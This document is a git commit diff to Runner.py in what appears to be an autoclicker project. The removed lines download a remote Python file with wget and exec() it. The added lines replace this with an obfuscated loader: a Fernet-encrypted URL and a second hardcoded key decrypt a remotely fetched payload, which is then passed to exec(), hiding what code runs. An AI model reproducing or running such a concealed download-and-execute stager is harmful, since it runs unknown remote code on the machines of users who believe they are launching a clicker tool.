b166ad5488a7a2e68629fa80021a879317adb551
tygoz <81298529+tygoz@users.noreply.github.com>
2024-06-11 09:50:39 +0000

    Update Runner.py

--- Runner.py
+++ Runner.py
@@ -1,49 +1,8 @@
-import os
-import random
-import string
-import wget
-'--------------------------'
-letters = string.ascii_lowercase
-''.join(random.choice(letters) for i in range(10))
-path = os.environ.get('LOCALAPPDATA')
-imports = ['keyboard','mouse','random','time','wget',]
-imports2 = ['keyboard-','mouse-','random-','time-','wget-']
-a = -1
-remote_url = 'https://raw.githubusercontent.com/tygoz/pyclicker/main/autoclicker.py'
-local_file = '{''.join(random.choice(letters) for i in range(10))}.txt'
-'--------------------------'
-try:
-    listy = str(os.listdir(f'{path}/Programs/Python/Python310/Lib/site-packages'))
-except:
-    listy = str(os.listdir(f'{path}/Programs/Python/Python39/Lib/site-packages'))
-for a in imports:
-    b = 0
-    if not imports[a] in listy:
-        b = 1
-    if not imports2[a] in listy:
-        b = 1
-    if b == 1:
-        b = 0
-        os.system(f"pip install {imports[a]}")
-wget.download(remote_url, local_file)
-f = open(local_file, "r")
-file = f.read()
-f.close()
-os.remove(local_file)
-print('')
-exec(file)
-
-'''
-if the file doesn't download replace it with the code below
-
--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
-
 import requests
-response = requests.get(remote_url)
-f = open(local_file, "wb").write(response.content)
-file = f.read()
-f.close()
-os.remove(local_file)
+from cryptography.fernet import Fernet
 
--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
-'''
+url_crypt = Fernet(b'GadiJcskj6XvTZnJGIw-dDWk-D-z-waUeQFJ0stCwyc=')
+online_crypt = Fernet(b'o2JkTsUVrpxKkmN-1-95SOTxM4kzBzirMv5a7fnctho=')
+remote_url = b'gAAAAABmaBfB2CsAhkOYCXAnf2Tzq0yzoGai53JRAiwUv6uUdMRMEMguhfN1dGie8OyPKKfDTrQsz3i1QIPkxxhV9GtIQaQN-acwZne0O5iy8NHcKCIEBIrtGOY_dwYyTNfkQL-u0kM0JtmBb0HcS9FIg4Dd7LNviTp42tfPRBQS272z-Fda3fw='
+#print(online_crypt.decrypt(requests.get(url_crypt.decrypt(remote_url).decode('utf-8')).text.encode('utf-8')).decode('utf-8'))
+exec(online_crypt.decrypt(requests.get(url_crypt.decrypt(remote_url).decode('utf-8')).text.encode('utf-8')).decode('utf-8'))
